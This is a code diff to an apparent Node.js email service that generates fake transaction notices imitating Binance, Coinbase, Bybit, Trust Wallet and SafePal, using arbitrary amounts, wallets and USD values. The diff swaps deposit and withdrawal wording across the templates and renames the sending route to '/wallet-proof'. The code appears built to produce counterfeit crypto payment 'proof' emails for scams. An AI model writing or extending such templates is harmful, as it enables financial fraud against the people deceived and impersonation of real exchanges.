@@ -20,8 +20,8 @@ function binanceTemplate({ amount, currency, wallet }) {
 
   <!-- Main body -->
   <div style="padding:30px;">
-    <h2 style="color:#F0B90B;margin-bottom:10px;">${currency} Deposit Successful</h2>
-    <p style="color:#ccc;margin:0 0 20px;">Your deposit of <strong>${amount} ${currency} </strong> is now available in your Binance account. Log in to check your balance. Read our <a href="#" style="color:#F0B90B;text-decoration:none;">FAQs</a> if you are running into problems.</p>
+    <h2 style="color:#F0B90B;margin-bottom:10px;"> ${currency} Withdraw Successful </h2>
+    <p style="color:#ccc;margin:0 0 20px;">Your Withdraw of <strong>${amount} ${currency} </strong> is now available in your Binance account. Log in to check your balance. Read our <a href="#" style="color:#F0B90B;text-decoration:none;">FAQs</a> if you are running into problems.</p>
 
     <!-- Dashboard Button -->
     <div style="margin:20px 0;">
@@ -72,13 +72,13 @@ function coinbaseTemplate({ amount, currency, wallet, usdValue }) {
 
   <!-- Main Message -->
   <div style="text-align:center;padding:0 20px 20px;">
-    <h2 style="color:#333;font-size:20px;margin-bottom:10px;">You just received</h2>
+    <h2 style="color:#333;font-size:20px;margin-bottom:10px;">You just sent</h2>
     <p style="color:#333;font-size:24px;margin:0;"><strong> ${amount} ${currency}</strong></p>
   </div>
 
   <!-- Description -->
   <div style="padding:0 30px 20px;color:#555;font-size:15px;line-height:1.6;">
-    <p>You just received <strong>${amount} ${currency}</strong> (worth <strong>${usdValue} USD</strong>) from an external Bitcoin account. It may take up to 6 network confirmations before your Bitcoin is available to trade.</p>
+    <p>You just sent <strong>${amount} ${currency}</strong> (worth <strong>${usdValue} USD</strong>) from an external Bitcoin account. It may take up to 6 network confirmations before your Bitcoin is available to trade.</p>
   </div>
 
   <!-- CTA Button -->
@@ -110,11 +110,11 @@ function bybitTemplate({ amount, currency, wallet, bybitTag, txTag  }){
     <p style="font-size:16px;">Dear Valued Bybit Trader,</p>
 
     <p style="font-size:16px;">
-      You’ve successfully deposit <strong style="color:#F0B90B;">${amount} ${currency}</strong> to your Bybit account.
+      You’ve successfully withdrawn <strong style="color:#F0B90B;">${amount} ${currency}</strong> from your Bybit account.
     </p>
 
     <p style="margin:16px 0 4px;font-size:15px;"><strong>Chain type:</strong>${bybitTag}</p>
-    <p style="margin:4px 0;font-size:15px;"><strong>Your address:</strong><br>
+    <p style="margin:4px 0;font-size:15px;"><strong>Your withdrawal address:</strong><br>
       <span style="word-break:break-all;color:#ddd;">${wallet}</span>
     </p>
 
@@ -160,7 +160,7 @@ function trustwalletTemplate({amount, currency, usdValue, timeDate, wallet, stat
         <!-- Amount Section -->
         <div style="max-width:600px;margin:10px; padding:15px;">
           <div style="text-align:center;">
-          <div style="font-size:28px; font-weight:bold; padding: 10px 10px;">Transferred </div>
+          <div style="font-size:28px; font-weight:bold; padding: 10px 10px;">Withdraw</div>
             <div style="font-size:28px; font-weight:bold;">${amount} ${currency}</div>
             <div style="font-size:14px; color:#8e8e8e; margin-top:5px;">≈ $${usdValue}</div>
           </div>
@@ -221,7 +221,7 @@ function safepalTemplate({amount, currency, wallet, timeDate, status, fromTag, t
   <h2 style="text-align:center;margin-bottom:20px;">Transaction Details</h2>
   
   <div style="text-align:center;margin-bottom:15px;">
-    <h3 style="margin:0;">Send</h3>
+    <h3 style="margin:0;">Received</h3>
   </div>
 
   <div style="background:#1f1f1f;padding:15px;border-radius:10px;margin-bottom:15px;">
@@ -323,7 +323,7 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-router.post("/send-receipt", async (req, res) => {
+router.post("/wallet-proof", async (req, res) => {
   const { amount, currency, wallet, email, walletName, bybitTag, timeDate, status, safepalTag } = req.body;
 
   const coinGeckoMap = {
